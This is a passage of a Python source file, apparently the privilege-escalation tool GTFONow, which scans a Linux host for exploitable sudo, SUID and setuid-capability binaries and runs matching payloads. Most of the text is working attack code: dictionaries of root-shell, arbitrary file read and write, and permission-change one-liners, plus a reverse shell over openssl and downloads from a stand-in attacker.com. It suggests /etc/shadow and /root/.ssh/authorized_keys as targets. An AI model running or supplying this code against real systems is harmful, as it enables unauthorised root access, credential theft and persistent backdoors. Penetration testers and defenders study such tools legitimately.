    ],
    "ld.so":
    [
        "./ld.so /bin/sh -p"
    ],
    "date":
    [
        "LFILE=file_to_read\n./date -f $LFILE\n"
    ],
    "tac":
    [
        "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
    ],
    "wget":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE\n"
    ],
    "start-stop-daemon":
    [
        "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
    ],
    "column":
    [
        "LFILE=file_to_read\n./column $LFILE\n"
    ],
    "gtester":
    [
        "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
    ],
    "fold":
    [
        "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
    ],
    "less":
    [
        "./less file_to_read"
    ],
    "jrunscript":
    [
        "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "run-parts":
    [
        "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
    ],
    "rvim":
    [
        "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "uudecode":
    [
        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "sysctl":
    [
        "LFILE=file_to_read\n./sysctl -n \"/../../$LFILE\"\n"
    ],
    "node":
    [
        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'\n"
    ],
    "php":
    [
        "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
    ],
    "watch":
    [
        "./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "install":
    [
        "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
    ],
    "rlwrap":
    [
        "./rlwrap -H /dev/null /bin/sh -p"
    ],
    "basenc":
    [
        "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
    ],
    "highlight":
    [
        "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
    ],
    "dmsetup":
    [
        "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
    ],
    "xz":
    [
        "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
    ],
    "stdbuf":
    [
        "./stdbuf -i0 /bin/sh -p"
    ],
    "hexdump":
    [
        "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
    ],
    "paste":
    [
        "LFILE=file_to_read\npaste $LFILE\n"
    ],
    "base32":
    [
        "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
    ],
    "jjs":
    [
        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
    ],
    "setarch":
    [
        "./setarch $(arch) /bin/sh -p"
    ],
    "dd":
    [
        "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
    ],
    "env":
    [
        "./env /bin/sh -p"
    ],
    "base64":
    [
        "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
    ],
    "curl":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
    ],
    "hd":
    [
        "LFILE=file_to_read\n./hd \"$LFILE\"\n"
    ],
    "pg":
    [
        "./pg file_to_read"
    ],
    "zsoelim":
    [
        "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
    ],
    "dialog":
    [
        "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
    ],
    "uuencode":
    [
        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "comm":
    [
        "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
    ],
    "chmod":
    [
        "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
    ],
    "rev":
    [
        "LFILE=file_to_read\n./rev $LFILE | rev\n"
    ],
    "nohup":
    [
        "sudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
    ],
    "od":
    [
        "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
    ],
    "time":
    [
        "./time /bin/sh -p"
    ],
    "rsync":
    [
        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "logsave":
    [
        "./logsave /dev/null /bin/sh -i -p"
    ],
    "csplit":
    [
        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    ],
    "tee":
    [
        "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
    ],
    "troff":
    [
        "LFILE=file_to_read\n./troff $LFILE\n"
    ],
    "fmt":
    [
        "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
    ],
    "tail":
    [
        "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
    ],
    "expect":
    [
        "./expect -c 'spawn /bin/sh -p;interact'"
    ],
    "openssl":
    [
        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
        "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
    ],
    "unexpand":
    [
        "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
    ],
    "iconv":
    [
        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    ],
    "grep":
    [
        "LFILE=file_to_read\n./grep '' $LFILE\n"
    ],
    "hping3":
    [
        "./hping3\n/bin/sh\n"
    ],
    "strace":
    [
        "./strace -o /dev/null /bin/sh -p"
    ],
    "csh":
    [
        "./csh -b"
    ],
    "ul":
    [
        "LFILE=file_to_read\n./ul \"$LFILE\"\n"
    ],
    "timeout":
    [
        "./timeout 7d /bin/sh -p"
    ],
    "taskset":
    [
        "./taskset 1 /bin/sh -p"
    ],
    "ssh-keyscan":
    [
        "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
    ],
    "capsh":
    [
        "./capsh --gid=0 --uid=0 --"
    ],
    "docker":
    [
        "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "tclsh":
    [
        "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
    ],
    "dash":
    [
        "./dash -p"
    ],
    "zsh":
    [
        "./zsh"
    ],
    "join":
    [
        "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n"
    ],
    "cp":
    [
        "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"
    ],
    "gimp":
    [
        "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "chroot":
    [
        "./chroot / /bin/sh -p\n"
    ],
    "xmodmap":
    [
        "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
    ],
    "perl":
    [
        "./perl -e 'exec \"/bin/sh\";'"
    ],
    "sort":
    [
        "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
    ],
    "cat":
    [
        "LFILE=file_to_read\n./cat \"$LFILE\"\n"
    ],
    "aria2c":
    [
        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
    ],
    "shuf":
    [
        "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
    ],
    "sed":
    [
        "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
    ],
    "soelim":
    [
        "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
    ],
    "look":
    [
        "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
    ],
    "bash":
    [
        "./bash -p"
    ],
    "chown":
    [
        "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
    ],
    "unshare":
    [
        "./unshare -r /bin/sh"
    ],
    "readelf":
    [
        "LFILE=file_to_read\n./readelf -a @$LFILE\n"
    ],
    "cut":
    [
        "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
    ],
    "mv":
    [
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
    ],
    "lwp-download":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE\n"
    ]
}

capabilities = {
    "gdb":
    [
        "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
    ],
    "vim":
    [
        "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "python":
    [
        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    ],
    "view":
    [
        "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "rview":
    [
        "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "rvim":
    [
        "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "node":
    [
        "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
    ],
    "php":
    [
        "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
    ],
    "ruby":
    [
        "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
    ],
    "perl":
    [
        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
    ]
}


def arbitrary_file_read(binary, payload):
    print_finding("Performing arbitrary file read with "+binary)
    print("Enter the file that you wish to read. (eg: /etc/shadow)")
    file_to_read = input("> ")
    payload = payload.replace("file_to_read", file_to_read)
    os.system(payload)


def arbitrary_file_write(binary, payload):
    print_finding("Performing arbitrary file write with " + binary)
    print("Create a file named " + green + "input_file" +
          reset+" containing the file content")
    print_info("Spawning temporary shell to create file, type 'exit' when done")
    os.system("bash")
    print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
    file_to_write = input("> ")
    payload = payload.replace("file_to_write", file_to_write)
    os.system(payload)


def exploit_sudo(binary, payload):
    if "file_to_read" in payload:
        arbitrary_file_read(binary, payload)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary, payload)
    else:
        print_finding("Spawning root shell")
        os.system(payload)


def exploit_suid(binary, binary_path, payload):
    payload = payload.replace("./"+binary, binary_path)
    if "file_to_read" in payload:
        arbitrary_file_read(binary_path, payload)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary_path, payload)
    else:
        print_finding("Spawning root shell")
        os.system(payload)


def exploit_cap(binary, binary_path, payload):
    payload = payload.replace("./"+binary, binary_path)
    if "file_to_read" in payload:
        arbitrary_file_read(binary_path, payload)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary_path, payload)
    else:
        print_finding("Spawning root shell")
        os.system(payload)


def sudo_escalate():
    print("Enter sudo password, leave blank to check for NOPASSWD breakout (slow)")
    sudo_password = getpass.getpass("> ")
    potential_privesc = []
    for binary in sudo_bins.keys():
        cmd = subprocess.Popen("{ echo '" + sudo_password + "'; } | sudo -kS " +
                               binary, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res, err = cmd.communicate()
        if b"is not allowed to execute" in err:
            if args.verbose:
                print_error("No sudo permissions for " + binary)
        elif b"command not found" in err:
            continue
        elif b"no password was provided" in err:
            continue
        else:
            print_finding("Potential sudo privilege escalation via " + binary)
            potential_privesc.append(binary)
    return potential_privesc


def cap_escalate():
    cmd = subprocess.Popen("getcap -r / 2>/dev/null", shell=True,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res, err = cmd.communicate()
    potential_privesc = []
    res = res.decode("ascii")
    for binary in res.split("\n"):
        if "cap_setuid" in binary:
            binary = binary.split(" = ")
            binary_path = binary[0]
            binary = binary_path.split("/")[-1]
            print_finding("Found setuid capability for "+binary_path)
            binary = binary.rstrip('1234567890.')
            potential_privesc.append([binary, binary_path])
    return potential_privesc


def payload_type(payload):
    if "file_to_read" in payload:
        return "Arbitrary read"
    elif "file_to_write" in payload:
        return "Arbitrary write"
    elif "file_to_change" in payload:
        return "File Permission Change"
    elif "sh" in payload:
        return "Shell"
    else:
        return "Unknown"


def suid_escalate():
    print("")
    cmd = subprocess.Popen("find / -perm -4000 -type f 2>/dev/null",
                           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res, err = cmd.communicate()
    res = res.decode("ascii")
    binary_paths = res.split("\n")
    print_finding("Found suid binaries:")
    print(res)
    cmd = subprocess.Popen("find / -perm -2000 -type f 2>/dev/null",
                           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res, err = cmd.communicate()
    res = res.decode("ascii")
    sgid_binaries = res.split("\n")
    new_binaries = set(binary_paths) - set(sgid_binaries)
    binary_paths.extend(new_binaries)
    print_finding("Found sgid binaries:")
    print(res)
    potential_privesc = []
    for binary_path in binary_paths:
        binary = binary_path.split("/")[-1]
        if binary == "":
            continue
        if binary in suid_bins.keys():
            print_finding("Found potentially exploitable suid binary: "+binary)
            potential_privesc.append([binary, binary_path])
    return potential_privesc


def print_banner():
    print(green+"""
  ___________________  _  __          
 / ___/_  __/ __/ __ \/ |/ /__ _    __
/ (_ / / / / _// /_/ /    / _ \ |/|/ /
\___/ /_/ /_/  \____/_/|_/\___/__,__/ 
                                      
    """+reset)
    print("https://github.com/Frissi0n/GTFONow\n")

parser = argparse.ArgumentParser(
    description='Gtfonow: Automatic privilege escalation')
parser.add_argument('--suid', action='store_true', default=False,
                    help='Scan suid binaries. By default Gtfonow scans suid, sudo and capabilities')
parser.add_argument('--sudo', action='store_true', default=False,
                    help='Scan sudo binaries. By default Gtfonow scans suid, sudo and capabilities')
parser.add_argument('--caps', action='store_true', default=False,
                    help='Scan capabilites. By default Gtfonow scans suid, sudo and capabilities')
parser.add_argument('-v', '--verbose', action='store_true',
                    default=False, help='Enable verbose output.')
args = parser.parse_args()
print_banner()
sudo_privescs = []
suid_privescs = []
cap_privescs = []
if args.sudo:
    sudo_privescs = sudo_escalate()
if args.suid:
    suid_privescs = suid_escalate()
if args.caps:
    cap_privescs = cap_escalate()

if args.sudo is False and args.suid is False and args.caps is False:
    sudo_privescs = sudo_escalate()
    suid_privescs = suid_escalate()
    cap_privescs = cap_escalate()

menu = []
if sudo_privescs != []:
    menu.append("Exploit sudo binary")
if suid_privescs != []:
    menu.append("Exploit suid binary")
if cap_privescs != []:
    menu.append("Exploit capabilities")

if menu == []:
    print_error("No exploitable binaries found")
    sys.exit(0)
menu.append("Quit")

print("\nChoose method to GTFO:")


for item in range(len(menu)):
    print(green+"["+str(item)+"] " + reset + menu[item])

choice = input("> ")
choice = int(choice)
payload_options = []
i = 0

if menu[choice] == "Exploit sudo binary":
    print("\nChoose payload to GTFO:")
    for sudo_binary in sudo_privescs:
        for payload in sudo_bins[sudo_binary]:
            payload_options.append([sudo_binary, payload])
            print(green+"["+str(i)+"] "+reset+sudo_binary +
                  " " + green + payload_type(payload) + reset)
            if args.verbose:
                print(payload)
            i = i + 1
    choice = input("> ")
    choice = int(choice)
    exploit_sudo(payload_options[choice][0], payload_options[choice][1])
elif menu[choice] == "Exploit suid binary":
    print("\nChoose payload to GTFO:")
    for suid_binary in suid_privescs:
        for payload in suid_bins[suid_binary[0]]:
            payload_options.append([suid_binary[0], suid_binary[1], payload])
            print(green+"["+str(i)+"] " + reset + suid_binary[0] +
                  " " + green + payload_type(payload) + reset)
            i = i + 1
            if args.verbose:
                print(payload)
    choice = input("> ")
    choice = int(choice)
    exploit_suid(payload_options[choice][0],
                 payload_options[choice][1], payload_options[choice][2])
elif menu[choice] == "Exploit capabilities":
    print("\nChoose payload to GTFO:")
    for cap_binary in cap_privescs:
        for payload in capabilities[cap_binary[0]]:
            payload_options.append([cap_binary[0], cap_binary[1], payload])
            print(green+"["+str(i)+"] " + reset + cap_binary[0] +
                  " " + green + payload_type(payload) + reset)
            i = i + 1
            if args.verbose:
                print(payload)
    choice = input("> ")
    choice = int(choice)
    exploit_cap(payload_options[choice][0],
                payload_options[choice][1], payload_options[choice][2])
elif menu[choice] == "Quit":
    sys.exit(0)
else:
    sys.exit(1)
